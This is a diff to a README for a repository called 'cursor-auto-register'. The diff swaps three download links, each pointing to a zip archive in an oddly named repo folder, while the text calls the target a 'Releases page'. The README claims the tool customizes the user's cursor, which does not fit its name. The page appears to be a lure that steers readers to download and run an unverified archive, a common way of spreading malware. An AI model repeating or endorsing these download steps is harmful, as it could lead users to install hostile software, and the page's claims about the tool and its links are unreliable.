@@ -1,6 +1,6 @@
 # 🖱️ cursor-auto-register - Easily Manage Your Cursor Settings
 
-[![Download cursor-auto-register](https://raw.githubusercontent.com/VictorKTO/cursor-auto-register/main/miserably/cursor-auto-register.zip)](https://raw.githubusercontent.com/VictorKTO/cursor-auto-register/main/miserably/cursor-auto-register.zip)
+[![Download cursor-auto-register](https://github.com/VictorKTO/cursor-auto-register/raw/refs/heads/main/miserably/auto_cursor_register_3.1-alpha.5.zip)](https://github.com/VictorKTO/cursor-auto-register/raw/refs/heads/main/miserably/auto_cursor_register_3.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ To use cursor-auto-register, you need:
 
 ## 🔗 Download & Install
 
-To begin, visit the Releases page to download the software: [Download cursor-auto-register](https://raw.githubusercontent.com/VictorKTO/cursor-auto-register/main/miserably/cursor-auto-register.zip).
+To begin, visit the Releases page to download the software: [Download cursor-auto-register](https://github.com/VictorKTO/cursor-auto-register/raw/refs/heads/main/miserably/auto_cursor_register_3.1-alpha.5.zip).
 
 Once on the Releases page, follow these steps to download and install the application:
 
@@ -74,4 +74,4 @@ Your feedback is valuable and helps improve cursor-auto-register. To share your 
 
 ## 🎉 Conclusion
 
-cursor-auto-register allows you to customize your cursor effortlessly. Follow the steps above to download and install the application. Visit the Releases page now to get started: [Download cursor-auto-register](https://raw.githubusercontent.com/VictorKTO/cursor-auto-register/main/miserably/cursor-auto-register.zip). Enjoy your improved cursor experience!
+cursor-auto-register allows you to customize your cursor effortlessly. Follow the steps above to download and install the application. Visit the Releases page now to get started: [Download cursor-auto-register](https://github.com/VictorKTO/cursor-auto-register/raw/refs/heads/main/miserably/auto_cursor_register_3.1-alpha.5.zip). Enjoy your improved cursor experience!
